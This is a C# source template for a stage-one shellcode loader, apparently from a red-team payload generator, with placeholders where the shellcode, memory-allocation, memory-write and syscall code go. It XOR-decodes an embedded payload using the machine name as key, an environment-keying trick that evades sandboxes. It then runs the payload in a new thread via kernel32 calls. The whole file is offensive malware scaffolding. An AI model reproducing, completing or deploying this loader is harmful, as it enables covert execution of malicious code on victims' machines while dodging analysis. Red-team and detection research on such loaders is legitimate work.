using System;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.Diagnostics;
using System.Text;
using System.Text.RegularExpressions;

namespace Stage1
{
    class Program
    {
        public static string ExpandString(string str, int length)
        {
            var result = new StringBuilder(length, length);
            var whole = length / str.Length;
            for (var i = 0; i < whole; i++)
            {
                result.Append(str);
            }
            result.Append(str, 0, length % str.Length);
            return result.ToString();
        }
        public static byte[] exclusiveOR(byte[] key, byte[] str)
        {
            for (int i = 0; i < str.Length; i++)
            {
                str[i] = (byte)(str[i] ^ key[i]);
            }
            return str;
        }

        static void Main()
        {
            //string key = "[SHAPESHIFTER_KEY]"; //hardcoded key
            string key = Environment.MachineName; //env variable keying with machine name
            //string key = Environment.UserDomainName; //env variable keying with UserDomainName
            byte[] encodedPayload = new byte[] { [SHAPESHIFTER_SHELLCODE] };
            string expandedKey = ExpandString(key, encodedPayload.Length);
            byte[] payload = exclusiveOR(Encoding.UTF8.GetBytes(expandedKey), encodedPayload);

        IntPtr hCurrentProcess = PInvokes.GetCurrentProcess();


            Console.WriteLine("[>] Allocating memory...");
            [SHAPESHIFTER_MEMALLOC]

            Console.WriteLine("[>] Writing to the buffer (0x{0:X} bytes)...", payload.Length);
            [SHAPESHIFTER_WRITEVM]

            Console.WriteLine("[>] Creating thread...");
            uint threadID = 0;
            IntPtr hThread = PInvokes.CreateThread(0, 0, (uint)pMemoryAllocation, IntPtr.Zero, 0, ref threadID);
            if (hThread == IntPtr.Zero)
            {
                return;
            }


            Console.WriteLine("[>] Waiting for the thread to start...");
            PInvokes.WaitForSingleObject(hThread, 0xFFFFFFFF);

            Console.WriteLine("[+] Operation complete");
            return;
        }
    }

    class PInvokes
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, uint lpStartAddress, IntPtr param, uint dwCreationFlags, ref uint lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [SHAPESHIFTER_PINVOKES]
    }

    class Syscalls
    {
        [SHAPESHIFTER_SYSCALLS]

        public struct Delegates
        {
            [SHAPESHIFTER_DELEGATES]
        }
    }
}